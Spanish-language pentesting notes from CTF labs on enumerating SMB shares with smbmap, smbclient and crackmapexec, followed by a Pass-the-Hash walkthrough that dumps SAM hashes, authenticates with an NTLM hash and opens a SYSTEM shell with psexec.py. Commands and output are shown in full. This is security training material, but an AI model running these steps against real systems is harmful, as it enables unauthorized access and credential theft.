# ENUMERACION CON SMB PORT 445
## Enumeración de recursos compartidos SMP

### ¿Qué es un SMB?
---

El puerto445 es "SMB sobre IP". SMB son las siglas de 'Server Message Blocks'. En lenguaje moderno, Server Message Block también se conoce como Common Internet File System. El sistema funciona como un protocolo de red de capa de aplicación utilizado principalmente para ofrecer acceso compartido a archivos, impresoras, puertos serie y otros tipos de comunicaciones entre nodos de una red.
Por ejemplo, en Windows, SMB puede ejecutarse directamente sobre TCP/IP sin necesidad de NetBIOS sobre TCP/IP. Esto utilizará, como señalas, el puerto 445. En otros sistemas, encontrarás servicios y aplicaciones que utilizan el puerto 139. Esto significa que SMB se ejecuta con NetBIOS sobre TCP/IP.

### Scanear Recursos Compartidos smbmap

```ruby
┌──(root㉿kali)-[/home/…/CTF/vulnhub/venom1/nmap]
└─# smbmap -H 192.168.200.150 
[+] Guest session       IP: 192.168.200.150:445 Name: venom.box                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (venom server (Samba, Ubuntu))
                                                                                                                       
```
En la ejecución anterior se puede evidenciar que existe recursos compartidos, sin embargo, no hay accesos.

### Scanear Recursos Compartidos smbclient

Se puede listar `flag -L`los recusros compartidos con  al herramienta smclient, usando el usuario anonymous o null session, `smbclient -L 10.10.10.3 -N` en caso de presentar error `NT-STATUS_CONNECTION_DISCONENECTED`, ese error puede se puede solucionar agregando el parametro `--options` como esta acontinuación.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/Lame/nmap]
└─# smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```
Cuando se encuantra recursos compartidos con accesos mediante null session, se puede autenticar a la carpeta, cona al herramienta `smbclient`.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/Lame/nmap]
└─# smbclient //10.10.10.3/tmp -N                                     
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 24 12:25:55 2023
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  .ICE-unix                          DH        0  Tue Jan 24 10:55:30 2023
  vmware-root                        DR        0  Tue Jan 24 10:55:58 2023
  .X11-unix                          DH        0  Tue Jan 24 10:55:55 2023
  .X0-lock                           HR       11  Tue Jan 24 10:55:55 2023
  5563.jsvc_up                        R        0  Tue Jan 24 10:56:32 2023
  vgauthsvclog.txt.0                  R     1600  Tue Jan 24 10:55:28 2023

                7282168 blocks of size 1024. 5386540 blocks available
smb: \> 
```
### Scanear Recursos Compartidos crackmapexec 
Aprovechando que el puerto smb esta abierto podemo ennumerar los recursos compartidos utilzando crackmapexec.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# crackmapexec smb 10.10.10.4
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
```
Para listar los recursos compartidos
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# crackmapexec smb 10.10.10.4 -u 'null' -p '' --shares           
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.10.10.4      445    LEGACY           [-] legacy\null: STATUS_LOGON_FAILURE 
```                                                                                          
### Pass The Hash

"Pass the Hash" (PtH) es una técnica utilizada por los atacantes en ciberseguridad para obtener acceso a sistemas y redes mediante el uso de hashes de contraseñas en lugar de la contraseña real. En lugar de adivinar o romper la contraseña de un usuario, los atacantes utilizan herramientas para extraer los hashes de las contraseñas almacenados en un sistema y luego utilizar esos hashes para autenticarse en el sistema como si tuvieran la contraseña real. Esto les permite obtener acceso a los recursos protegidos por el usuario afectado.
```java
┌──(root㉿kali)-[/home/s3cur1ty3c]
└─# crackmapexec smb 10.10.10.152 -u 'usuariodos' -p 'p3nT3st!' --sam
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\usuariodos:p3nT3st! (Pwn3d!)
SMB         10.10.10.152    445    NETMON           [+] Dumping SAM hashes
SMB         10.10.10.152    445    NETMON           Administrator:500:aad3b435b51404eeaad3b435b51404ee:d0f73603a4d96655430fdf02de4afaee:::
SMB         10.10.10.152    445    NETMON           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.152    445    NETMON           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.152    445    NETMON           usuariodos:1000:aad3b435b51404eeaad3b435b51404ee:6df6a842ba1250d3fbf4ab6b3d54bcbc:::
SMB         10.10.10.152    445    NETMON           [+] Added 4 SAM hashes to the database
```
Con las hashes obtenidos se puede hacer un pass the hashses, con crackmapexec.
```java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/HTB]
└─# crackmapexec smb 10.10.10.152 -u 'Administrator' -H 'd0f73603a4d96655430fdf02de4afaee'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\Administrator:d0f73603a4d96655430fdf02de4afaee (Pwn3d!)
```
Con la herramienta `psexec.py`, se puede utilizar el hashs para iniciar una sesion mediante una shell.

```java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/HTB]
└─# psexec.py WORKGROUP/Administrator@10.10.10.152 -hashes :d0f73603a4d96655430fdf02de4afaee
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file OHhKIKGU.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service NKHY on 10.10.10.152.....
[*] Starting service NKHY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>
```